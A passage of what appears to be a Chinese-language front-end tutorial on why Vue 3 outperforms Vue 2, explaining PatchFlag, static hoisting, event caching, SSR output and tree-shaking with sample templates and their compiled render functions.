        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'instance'</span><span class="token punctuation">,</span> instance<span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token function">mounted</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'this2'</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">)</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'y'</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>y<span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre></div><h3 id="vue3为何比vue2快"><a href="#vue3为何比vue2快" class="header-anchor">#</a> Vue3为何比Vue2快</h3> <ul><li><code>proxy</code>响应式：深度监听，性能更好（获取到哪一层才触发响应式<code>get</code>，不是一次性递归）</li> <li><code>PatchFlag</code> 动态节点做标志</li> <li><code>HoistStatic</code> 将静态节点的定义，提升到父作用域，缓存起来。多个相邻的静态节点，会被合并起来</li> <li><code>CacheHandler</code> 事件缓存</li> <li><code>SSR</code>优化: 静态节点不走<code>vdom</code>逻辑，直接输出字符串，动态节点才走</li> <li><code>Tree-shaking</code> 根据模板的内容动态<code>import</code>不同的内容，不需要就不<code>import</code></li></ul> <h3 id="什么是patchflag"><a href="#什么是patchflag" class="header-anchor">#</a> 什么是PatchFlag</h3> <ul><li>模板编译时，动态节点做标记</li> <li>标记，分为不同类型，如<code>Text</code>、<code>PROPS</code>、<code>CLASS</code></li> <li><code>diff</code>算法时，可区分静态节点，以及不同类型的动态节点</li></ul> <p><img alt="" data-src="https://s.poetries.work/uploads/2023/02/36af2f141c7659aa.png" loading="lazy" class="lazy"></p> <div class="language-vue extra-class"><pre class="language-vue"><code><span class="token comment">&lt;!-- https://vue-next-template-explorer.netlify.app 中打开查看编译结果 --&gt;</span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">&gt;</span></span>hello vue3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">&gt;</span></span>{{msg}}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">:class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>name<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>poetry<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">:id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>name<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>poetry<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">:id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>name<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>{{msg}}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">:id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>name<span class="token punctuation">&quot;</span></span> <span class="token attr-name">:msg</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>msg<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>poetry<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 编译后结果</span>

<span class="token keyword">import</span> <span class="token punctuation">{</span> createElementVNode <span class="token keyword">as</span> _createElementVNode<span class="token punctuation">,</span> toDisplayString <span class="token keyword">as</span> _toDisplayString<span class="token punctuation">,</span> normalizeClass <span class="token keyword">as</span> _normalizeClass<span class="token punctuation">,</span> openBlock <span class="token keyword">as</span> _openBlock<span class="token punctuation">,</span> createElementBlock <span class="token keyword">as</span> _createElementBlock <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">&quot;vue&quot;</span>

<span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">render</span><span class="token punctuation">(</span><span class="token parameter">_ctx<span class="token punctuation">,</span> _cache<span class="token punctuation">,</span> $props<span class="token punctuation">,</span> $setup<span class="token punctuation">,</span> $data<span class="token punctuation">,</span> $options</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token function">_openBlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">_createElementBlock</span><span class="token punctuation">(</span><span class="token string">&quot;div&quot;</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>
    <span class="token function">_createElementVNode</span><span class="token punctuation">(</span><span class="token string">&quot;span&quot;</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">&quot;hello vue3&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">_createElementVNode</span><span class="token punctuation">(</span><span class="token string">&quot;span&quot;</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token function">_toDisplayString</span><span class="token punctuation">(</span>_ctx<span class="token punctuation">.</span>msg<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span> <span class="token comment">/* TEXT */</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">// 文本标记1</span>
    <span class="token function">_createElementVNode</span><span class="token punctuation">(</span><span class="token string">&quot;span&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
      <span class="token keyword">class</span><span class="token operator">:</span> <span class="token function">_normalizeClass</span><span class="token punctuation">(</span>_ctx<span class="token punctuation">.</span>name<span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token string">&quot;poetry&quot;</span><span class="token punctuation">,</span> <span class="token number">2</span> <span class="token comment">/* CLASS */</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">// class标记2</span>
    <span class="token function">_createElementVNode</span><span class="token punctuation">(</span><span class="token string">&quot;span&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token literal-property property">id</span><span class="token operator">:</span> _ctx<span class="token punctuation">.</span>name <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token string">&quot;poetry&quot;</span><span class="token punctuation">,</span> <span class="token number">8</span> <span class="token comment">/* PROPS */</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">&quot;id&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">// 属性props标记8</span>
    <span class="token function">_createElementVNode</span><span class="token punctuation">(</span><span class="token string">&quot;span&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token literal-property property">id</span><span class="token operator">:</span> _ctx<span class="token punctuation">.</span>name <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token function">_toDisplayString</span><span class="token punctuation">(</span>_ctx<span class="token punctuation">.</span>msg<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">9</span> <span class="token comment">/* TEXT, PROPS */</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">&quot;id&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">// 文本和属性组合标记9</span>
    <span class="token function">_createElementVNode</span><span class="token punctuation">(</span><span class="token string">&quot;span&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
      <span class="token literal-property property">id</span><span class="token operator">:</span> _ctx<span class="token punctuation">.</span>name<span class="token punctuation">,</span>
      <span class="token literal-property property">msg</span><span class="token operator">:</span> _ctx<span class="token punctuation">.</span>msg
    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token string">&quot;poetry&quot;</span><span class="token punctuation">,</span> <span class="token number">8</span> <span class="token comment">/* PROPS */</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">&quot;id&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;msg&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment">// 属性组合标记</span>
  <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>

</code></pre></div><h3 id="什么是hoiststatic和cachehandler"><a href="#什么是hoiststatic和cachehandler" class="header-anchor">#</a> 什么是HoistStatic和CacheHandler</h3> <p><strong>HoistStatic</strong></p> <ul><li>将静态节点的定义，提升到父作用域，缓存起来</li> <li>多个相邻的静态节点，会被合并起来</li> <li>典型的拿空间换时间的优化策略</li></ul> <div class="language-vue extra-class"><pre class="language-vue"><code><span class="token comment">&lt;!-- https://vue-next-template-explorer.netlify.app 中打开查看编译结果：options开启hoistStatic --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">&gt;</span></span>hello vue3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">&gt;</span></span>hello vue3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">&gt;</span></span>hello vue3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">&gt;</span></span>{{msg}}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 编译结果</span>

<span class="token keyword">import</span> <span class="token punctuation">{</span> createElementVNode <span class="token keyword">as</span> _createElementVNode<span class="token punctuation">,</span> toDisplayString <span class="token keyword">as</span> _toDisplayString<span class="token punctuation">,</span> openBlock <span class="token keyword">as</span> _openBlock<span class="token punctuation">,</span> createElementBlock <span class="token keyword">as</span> _createElementBlock <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">&quot;vue&quot;</span>

<span class="token comment">// 之后函数怎么执行，这些变量都不会被重复定义一遍</span>
<span class="token keyword">const</span> _hoisted_1 <span class="token operator">=</span> <span class="token comment">/*#__PURE__*/</span><span class="token function">_createElementVNode</span><span class="token punctuation">(</span><span class="token string">&quot;span&quot;</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">&quot;hello vue3&quot;</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token comment">/* HOISTED */</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> _hoisted_2 <span class="token operator">=</span> <span class="token comment">/*#__PURE__*/</span><span class="token function">_createElementVNode</span><span class="token punctuation">(</span><span class="token string">&quot;span&quot;</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">&quot;hello vue3&quot;</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token comment">/* HOISTED */</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> _hoisted_3 <span class="token operator">=</span> <span class="token comment">/*#__PURE__*/</span><span class="token function">_createElementVNode</span><span class="token punctuation">(</span><span class="token string">&quot;span&quot;</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">&quot;hello vue3&quot;</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token comment">/* HOISTED */</span><span class="token punctuation">)</span>

<span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">render</span><span class="token punctuation">(</span><span class="token parameter">_ctx<span class="token punctuation">,</span> _cache<span class="token punctuation">,</span> $props<span class="token punctuation">,</span> $setup<span class="token punctuation">,</span> $data<span class="token punctuation">,</span> $options</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token function">_openBlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">_createElementBlock</span><span class="token punctuation">(</span><span class="token string">&quot;div&quot;</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>
    _hoisted_1<span class="token punctuation">,</span>
    _hoisted_2<span class="token punctuation">,</span>
    _hoisted_3<span class="token punctuation">,</span>
    <span class="token function">_createElementVNode</span><span class="token punctuation">(</span><span class="token string">&quot;span&quot;</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token function">_toDisplayString</span><span class="token punctuation">(</span>_ctx<span class="token punctuation">.</span>msg<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span> <span class="token comment">/* TEXT */</span><span class="token punctuation">)</span>
  <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre></div><div class="language-vue extra-class"><pre class="language-vue"><code><span class="token comment">&lt;!-- https://vue-next-template-explorer.netlify.app 中打开查看编译结果：options开启hoistStatic --&gt;</span>
<span class="token comment">&lt;!-- 当相同的节点达到一定阈值后会被vue3合并起来 --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">&gt;</span></span>hello vue3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">&gt;</span></span>hello vue3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">&gt;</span></span>hello vue3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">&gt;</span></span>hello vue3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">&gt;</span></span>hello vue3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">&gt;</span></span>hello vue3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">&gt;</span></span>hello vue3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">&gt;</span></span>hello vue3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">&gt;</span></span>hello vue3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">&gt;</span></span>hello vue3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">&gt;</span></span>{{msg}}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 编译之后</span>

<span class="token keyword">import</span> <span class="token punctuation">{</span> createElementVNode <span class="token keyword">as</span> _createElementVNode<span class="token punctuation">,</span> toDisplayString <span class="token keyword">as</span> _toDisplayString<span class="token punctuation">,</span> createStaticVNode <span class="token keyword">as</span> _createStaticVNode<span class="token punctuation">,</span> openBlock <span class="token keyword">as</span> _openBlock<span class="token punctuation">,</span> createElementBlock <span class="token keyword">as</span> _createElementBlock <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">&quot;vue&quot;</span>

<span class="token comment">// 多个相邻的静态节点，会被合并起来</span>
<span class="token keyword">const</span> _hoisted_1 <span class="token operator">=</span> <span class="token comment">/*#__PURE__*/</span><span class="token function">_createStaticVNode</span><span class="token punctuation">(</span><span class="token string">&quot;&lt;span&gt;hello vue3&lt;/span&gt;&lt;span&gt;hello vue3&lt;/span&gt;&lt;span&gt;hello vue3&lt;/span&gt;&lt;span&gt;hello vue3&lt;/span&gt;&lt;span&gt;hello vue3&lt;/span&gt;&lt;span&gt;hello vue3&lt;/span&gt;&lt;span&gt;hello vue3&lt;/span&gt;&lt;span&gt;hello vue3&lt;/span&gt;&lt;span&gt;hello vue3&lt;/span&gt;&lt;span&gt;hello vue3&lt;/span&gt;&quot;</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span>

<span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">render</span><span class="token punctuation">(</span><span class="token parameter">_ctx<span class="token punctuation">,</span> _cache<span class="token punctuation">,</span> $props<span class="token punctuation">,</span> $setup<span class="token punctuation">,</span> $data<span class="token punctuation">,</span> $options</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token function">_openBlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">_createElementBlock</span><span class="token punctuation">(</span><span class="token string">&quot;div&quot;</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>
    _hoisted_1<span class="token punctuation">,</span>
    <span class="token function">_createElementVNode</span><span class="token punctuation">(</span><span class="token string">&quot;span&quot;</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token function">_toDisplayString</span><span class="token punctuation">(</span>_ctx<span class="token punctuation">.</span>msg<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span> <span class="token comment">/* TEXT */</span><span class="token punctuation">)</span>
  <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre></div><p><strong>CacheHandler</strong> 缓存事件</p> <div class="language-vue extra-class"><pre class="language-vue"><code><span class="token comment">&lt;!-- https://vue-next-template-explorer.netlify.app 中打开查看编译结果：options开启cacheHandler --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">@click</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>clickHandler<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>hello vue3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 编译之后</span>

<span class="token keyword">import</span> <span class="token punctuation">{</span> createElementVNode <span class="token keyword">as</span> _createElementVNode<span class="token punctuation">,</span> openBlock <span class="token keyword">as</span> _openBlock<span class="token punctuation">,</span> createElementBlock <span class="token keyword">as</span> _createElementBlock <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">&quot;vue&quot;</span>

<span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">render</span><span class="token punctuation">(</span><span class="token parameter">_ctx<span class="token punctuation">,</span> _cache<span class="token punctuation">,</span> $props<span class="token punctuation">,</span> $setup<span class="token punctuation">,</span> $data<span class="token punctuation">,</span> $options</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token function">_openBlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">_createElementBlock</span><span class="token punctuation">(</span><span class="token string">&quot;div&quot;</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>
    <span class="token function">_createElementVNode</span><span class="token punctuation">(</span><span class="token string">&quot;span&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
      <span class="token literal-property property">onClick</span><span class="token operator">:</span> _cache<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">||</span> <span class="token punctuation">(</span>_cache<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter"><span class="token operator">...</span>args</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">(</span>_ctx<span class="token punctuation">.</span>clickHandler <span class="token operator">&amp;&amp;</span> _ctx<span class="token punctuation">.</span><span class="token function">clickHandler</span><span class="token punctuation">(</span><span class="token operator">...</span>args<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token string">&quot;hello vue3&quot;</span><span class="token punctuation">)</span>
  <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre></div><h3 id="ssr和tree-shaking的优化"><a href="#ssr和tree-shaking的优化" class="header-anchor">#</a> SSR和Tree-shaking的优化</h3> <p><strong>SSR优化</strong></p> <ul><li>静态节点直接输出，绕过了<code>vdom</code></li> <li>动态节点，还是需要动态渲染</li></ul> <div class="language-vue extra-class"><pre class="language-vue"><code><span class="token comment">&lt;!-- https://vue-next-template-explorer.netlify.app 中打开查看编译结果：options开启ssr --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">&gt;</span></span>hello vue3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">&gt;</span></span>hello vue3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">&gt;</span></span>hello vue3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">&gt;</span></span>{{msgs}}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 编译之后</span>

<span class="token keyword">import</span> <span class="token punctuation">{</span> mergeProps <span class="token keyword">as</span> _mergeProps <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">&quot;vue&quot;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> ssrRenderAttrs <span class="token keyword">as</span> _ssrRenderAttrs<span class="token punctuation">,</span> ssrInterpolate <span class="token keyword">as</span> _ssrInterpolate <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">&quot;vue/server-renderer&quot;</span>

<span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">ssrRender</span><span class="token punctuation">(</span><span class="token parameter">_ctx<span class="token punctuation">,</span> _push<span class="token punctuation">,</span> _parent<span class="token punctuation">,</span> _attrs<span class="token punctuation">,</span> $props<span class="token punctuation">,</span> $setup<span class="token punctuation">,</span> $data<span class="token punctuation">,</span> $options</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> _cssVars <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token literal-property property">style</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token literal-property property">color</span><span class="token operator">:</span> _ctx<span class="token punctuation">.</span>color <span class="token punctuation">}</span><span class="token punctuation">}</span>
  <span class="token function">_push</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;div</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>
    <span class="token function">_ssrRenderAttrs</span><span class="token punctuation">(</span><span class="token function">_mergeProps</span><span class="token punctuation">(</span>_attrs<span class="token punctuation">,</span> _cssVars<span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">&gt;&lt;span&gt;hello vue3&lt;/span&gt;&lt;span&gt;hello vue3&lt;/span&gt;&lt;span&gt;hello vue3&lt;/span&gt;&lt;span&gt;</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span> <span class="token comment">// 静态节点直接输出</span>
    <span class="token function">_ssrInterpolate</span><span class="token punctuation">(</span>_ctx<span class="token punctuation">.</span>msgs<span class="token punctuation">)</span>
  <span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">&lt;/span&gt;&lt;/div&gt;</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre></div><p><strong>Tree Shaking优化</strong></p> <blockquote><p>编译时，根据不同的情况，引入不同的<code>API</code>，不会全部引用</p></blockquote> <div class="language-vue extra-class"><pre class="language-vue"><code><span class="token comment">&lt;!-- https://vue-next-template-explorer.netlify.app 中打开查看编译结果 --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">v-if</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>msg<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>hello vue3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">v-model</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>msg<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 编译之后</span>

<span class="token comment">// 模板编译会根据模板写法 指令 插值以及用了特别的功能去动态的import相应的接口，需要什么就import什么，这就是tree shaking</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> openBlock <span class="token keyword">as</span> _openBlock<span class="token punctuation">,</span> createElementBlock <span class="token keyword">as</span> _createElementBlock<span class="token punctuation">,</span> createCommentVNode <span class="token keyword">as</span> _createCommentVNode<span class="token punctuation">,</span> vModelText <span class="token keyword">as</span> _vModelText<span class="token punctuation">,</span> createElementVNode <span class="token keyword">as</span> _createElementVNode<span class="token punctuation">,</span> withDirectives <span class="token keyword">as</span> _withDirectives <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">&quot;vue&quot;</span>

